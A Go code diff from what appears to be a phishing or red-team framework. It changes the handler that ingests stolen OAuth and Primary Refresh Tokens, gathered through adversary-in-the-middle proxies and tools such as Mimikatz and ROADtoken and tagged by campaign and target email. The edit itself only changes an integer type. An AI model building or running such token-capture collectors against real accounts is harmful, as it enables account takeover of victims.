@@ -76,16 +76,16 @@ type TokenListenerStatus struct {
 // emitted by AiTM proxies (evilginx-style JSON), PRT captures (LSASS/CloudAP,
 // ROADtoken, AADInternals, Mimikatz), and hand-written drops.
 type tokenIntake struct {
-	AccessToken  string `json:"access_token"`
-	RefreshToken string `json:"refresh_token"`
-	IDToken      string `json:"id_token"`
-	TokenType    string `json:"token_type"`
-	ExpiresIn    int    `json:"expires_in"`
-	Scope        string `json:"scope"`
-	CampaignID   string `json:"campaign_id"`
-	TargetID     string `json:"target_id"`
-	TargetEmail  string `json:"target_email"`
-	Source       string `json:"source"`
+	AccessToken  string             `json:"access_token"`
+	RefreshToken string             `json:"refresh_token"`
+	IDToken      string             `json:"id_token"`
+	TokenType    string             `json:"token_type"`
+	ExpiresIn    devicecode.FlexInt `json:"expires_in"`
+	Scope        string             `json:"scope"`
+	CampaignID   string             `json:"campaign_id"`
+	TargetID     string             `json:"target_id"`
+	TargetEmail  string             `json:"target_email"`
+	Source       string             `json:"source"`
 
 	// ─── Primary Refresh Token intake ───────────────────────────────────────
 	// A PRT is not a bearer token: it is stored in the PRT vault and used to
@@ -321,7 +321,7 @@ func (tl *TokenListener) handleIntake(w http.ResponseWriter, r *http.Request) {
 		RefreshToken: intake.RefreshToken,
 		IDToken:      intake.IDToken,
 		TokenType:    intake.TokenType,
-		ExpiresIn:    intake.ExpiresIn,
+		ExpiresIn:    int(intake.ExpiresIn),
 		Scope:        intake.Scope,
 		TargetID:     intake.TargetID,
 		TargetEmail:  intake.TargetEmail,
@@ -562,7 +562,8 @@ func parseTokenIntake(r *http.Request) (tokenIntake, error) {
 		in.TokenType = r.PostForm.Get("token_type")
 		in.Scope = r.PostForm.Get("scope")
 		if v := r.PostForm.Get("expires_in"); v != "" {
-			in.ExpiresIn, _ = strconv.Atoi(v)
+			n, _ := strconv.Atoi(v)
+			in.ExpiresIn = devicecode.FlexInt(n)
 		}
 		in.CampaignID = r.PostForm.Get("campaign_id")
 		in.TargetID = r.PostForm.Get("target_id")
